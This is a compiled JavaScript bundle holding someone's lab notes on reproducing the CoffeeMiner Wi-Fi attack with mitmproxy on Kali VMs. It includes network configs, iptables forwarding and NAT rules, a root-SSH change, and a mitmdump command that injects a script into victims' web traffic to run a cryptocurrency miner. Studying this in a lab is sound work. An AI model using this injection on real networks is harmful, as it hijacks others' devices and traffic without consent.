(window.webpackJsonp=window.webpackJsonp||[]).push([[88],{517:function(t,e,a){"use strict";a.r(e);var s=a(56),r=Object(s.a)({},(function(){var t=this,e=t.$createElement,a=t._self._c||e;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("p",[t._v("https://www.youtube.com/watch?v=wmYJ6Z4LoCA\nhttp://arnaucube.com/blog/coffeeminer-hacking-wifi-cryptocurrency-miner.html\nhttps://github.com/arnaucube/coffeeMiner\nhttps://github.com/arnaucube/coffeeMiner/blob/master/virtualbox_scenario_instructions.md")]),t._v(" "),a("h2",{attrs:{id:"_1-mitmproxy"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-mitmproxy"}},[t._v("#")]),t._v(" 1. Mitmproxy")]),t._v(" "),a("p",[t._v("https://mitmproxy.org/\nhttps://docs.mitmproxy.org/stable/")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("root@kali:~# mitmproxy --version\nMitmproxy: 4.0.4\nPython:\t3.6.8\nOpenSSL:   OpenSSL 1.1.1a  20 Nov 2018\nPlatform:  Linux-4.19.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling\nroot@kali:~# mitmdump --version\nMitmproxy: 4.0.4\nPython:\t3.6.8\nOpenSSL:   OpenSSL 1.1.1a  20 Nov 2018\nPlatform:  Linux-4.19.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling\n")])])]),a("h3",{attrs:{id:"_1-1-local-setup-test"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-1-local-setup-test"}},[t._v("#")]),t._v(" 1.1 Local setup test")]),t._v(" "),a("p",[t._v("https://medium.com/max-greenwalds-blog/mitmproxy-your-d-i-y-private-eye-864c08f84736\nhttps://juejin.im/post/5ac9ea6d518825364001b5b9\nhttps://blog.heckel.xyz/2013/07/01/how-to-use-mitmproxy-to-read-and-modify-https-traffic-of-your-phone/")]),t._v(" "),a("p",[t._v("Run mitmproxy")]),t._v(" "),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm01.png",alt:""}}),t._v(" "),a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm02.png",alt:""}})]),t._v(" "),a("p",[t._v("Open mitm.it\nhttps://github.com/mitmproxy/mitmproxy/issues/3034\nWorkaround was navigating to http://mitm.it/cert/pem")]),t._v(" "),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm03.png",alt:""}})]),t._v(" "),a("h3",{attrs:{id:"_1-2-coffeeminer-test"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-2-coffeeminer-test"}},[t._v("#")]),t._v(" 1.2 Coffeeminer test")]),t._v(" "),a("p",[a("strong",[t._v("Victim")])]),t._v(" "),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm04.png",alt:""}}),t._v(" "),a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm05.png",alt:""}})]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("root@kali:~# vim /etc/network/interfaces\nroot@kali:~# /etc/init.d/networking restart\n[ ok ] Restarting networking (via systemctl): networking.service.\nroot@kali:~# cat /etc/network/interfaces\n# This file describes the network interfaces available on your system\n# and how to activate them. For more information, see interfaces(5).\n\nsource /etc/network/interfaces.d/*\n\n# The loopback network interface\nauto lo\niface lo inet loopback\n\nauto eth0\niface eth0 inet static\n\taddress 192.168.134.4\n\tnetmask 255.255.255.0\n\tgateway 192.168.134.6\n\n")])])]),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm06.png",alt:""}})]),t._v(" "),a("p",[t._v("Script\nParam https://github.com/mitmproxy/mitmproxy/blob/master/examples/simple/custom_option.py\nhttps://docs.mitmproxy.org/stable/addons-options/")]),t._v(" "),a("p",[a("strong",[t._v("Attacker")])]),t._v(" "),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm07.png",alt:""}}),t._v(" "),a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm08.png",alt:""}})]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("root@kali:~# cat /etc/network/interfaces\n# This file describes the network interfaces available on your system\n# and how to activate them. For more information, see interfaces(5).\n\nsource /etc/network/interfaces.d/*\n\n# The loopback network interface\nauto lo\niface lo inet loopback\n\nauto eth0\niface eth0 inet static\n\taddress 192.168.134.3\n\tnetmask 255.255.255.0\n\tgateway 192.168.134.6\n\n")])])]),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm09.png",alt:""}})]),t._v(" "),a("p",[a("strong",[t._v("Router")])]),t._v(" "),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm10.png",alt:""}})]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v('#Dhclient etho0\nroot@kali:~# vim /etc/network/interfaces\nroot@kali:~# /etc/init.d/networking restart\n[....] Restarting networking (via systemctl): networking.serviceJob for networking.service failed because the control process exited with error code.\nSee "systemctl status networking.service" and "journalctl -xe" for details.\n failed!\n\n\noot@kali:~# cat /etc/network/interfaces\n# This file describes the network interfaces available on your system\n# and how to activate them. For more information, see interfaces(5).\n\nsource /etc/network/interfaces.d/*\n\n# The loopback network interface\nauto lo\niface lo inet loopback\n\nauto eth0\niface eth0 inet dhcp\n\nauto eth1\niface eth1 inet static\n\taddress 192.168.134.6\n\tnetmask 255.255.255.0\n')])])]),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm11.png",alt:""}})]),t._v(" "),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm12.png",alt:""}})]),t._v(" "),a("p",[a("strong",[t._v("Start")])]),t._v(" "),a("p",[t._v("router_kali")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("root@kali:~# iptables --flush\nroot@kali:~# iptables --table nat --flush\nroot@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward\nroot@kali:~# iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\nroot@kali:~# iptables -A FOWARD -i eth0 -o eth1 -j ACCEPT\niptables v1.8.2 (nf_tables): Chain 'FOWARD' does not exist\nroot@kali:~# iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT\nroot@kali:~# iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT\n")])])]),a("p",[t._v("Attack")]),t._v(" "),a("div",{staticClass:"language- extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("vim /etc/ssh/sshd_config\nPemitRootLogin yes\nsystemctl restart ssh.service\n")])])]),a("p",[a("img",{attrs:{src:"/docs/docs_image/coder2hacker/realcase/mitm13.png",alt:""}})]),t._v(" "),a("p",[t._v("mitmdump -s injector.py --set custom='http://127.0.0.1:8000/script.js'")]),t._v(" "),a("h2",{attrs:{id:"troubleshooting"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#troubleshooting"}},[t._v("#")]),t._v(" troubleshooting")]),t._v(" "),a("p",[t._v("mitmdump was not found https://github.com/arnaucube/coffeeMiner/issues/26\n/usr/bin/mitmdump no such script https://unix.stackexchange.com/questions/446289/mitmdump-error-usr-bin-mitmdump-no-such-scripts\nunrecognized arguments: -T https://github.com/arnaucube/coffeeMiner/issues/28")]),t._v(" "),a("h2",{attrs:{id:"applications"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#applications"}},[t._v("#")]),t._v(" Applications")]),t._v(" "),a("p",[t._v("https://engineering.linecorp.com/en/blog/auto-inspecting-testing-with-google-analytics/")])])}),[],!1,null,null,null);e.default=r.exports}}]);